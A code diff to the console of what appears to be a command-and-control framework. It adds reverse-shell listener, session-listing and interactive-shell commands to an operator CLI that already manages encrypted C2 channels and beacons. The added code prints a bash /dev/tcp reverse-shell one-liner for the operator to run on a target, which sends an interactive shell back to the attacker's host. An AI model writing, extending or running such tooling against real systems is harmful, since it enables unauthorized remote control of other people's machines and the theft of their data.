@@ -76,6 +76,11 @@ class Console:
     key <passphrase>                set AES key used to encrypt C2 traffic
     keys                            show configured channel options
 
+  Reverse shells (raw TCP interactive)
+    reverse-shell <host> <port>     start a reverse-shell listener
+    rsh-list                        list live reverse-shell sessions
+    rsh-shell <session_id>          interact with a live reverse shell
+
   Sessions
     sessions                        list active beacons
     interactive                     choose a session for interactive tasking
@@ -270,6 +275,51 @@ class Console:
             return
         v = self.srv.set_beacon_interval(sec)
         print(f"[*] default beacon interval set to {v}s")
+
+    # ---------- reverse-shell (raw TCP interactive shell) ----------
+    def cmd_reverse_shell(self, rest):
+        """reverse-shell <host> <port> [name] -> start a raw TCP reverse-shell listener"""
+        parts = rest.split(maxsplit=2)
+        if len(parts) < 2:
+            print("[!] usage: reverse-shell <host> <port> [name]")
+            return
+        try:
+            host = parts[0]
+            port = int(parts[1])
+            name = parts[2] if len(parts) > 2 else "rsh"
+        except ValueError:
+            print("[!] usage: reverse-shell <host> <port> [name]")
+            return
+        lis, err = self.srv.start_reverse_shell(name, host, port)
+        if err:
+            print(f"[!] {err}")
+        else:
+            print(f"[+] reverse-shell listener '{name}' on {host}:{port}")
+            print("    run on target:  bash -i >& /dev/tcp/<PUBLIC_IP>/%d 0>&1" % port)
+
+    def cmd_rsh_list(self, _):
+        found = False
+        for name, lis in self.srv.rsh_listeners.items():
+            for s in lis.list_sessions():
+                found = True
+                print(f"  {s.id:<10} {name:<10} {s.addr[0]}:{s.addr[1]:<6} open={s.open}")
+        if not found:
+            print("[-] no reverse-shell sessions (start one with: reverse-shell <host> <port>)")
+
+    def cmd_rsh_shell(self, rest):
+        """rsh-shell <session_id> -> interact with a live reverse shell"""
+        from ..server.reverseshell import interactive_loop
+        sid = rest.strip()
+        sess = None
+        for lis in self.srv.rsh_listeners.values():
+            sess = lis.get(sid)
+            if sess:
+                break
+        if not sess:
+            print(f"[!] no reverse-shell session {sid}. see 'rsh-list'")
+            return
+        print(f"[*] interactive reverse shell [{sid}]; type 'exit' to detach")
+        interactive_loop(self.srv, sess)
 
 
 def run_cli(argv):
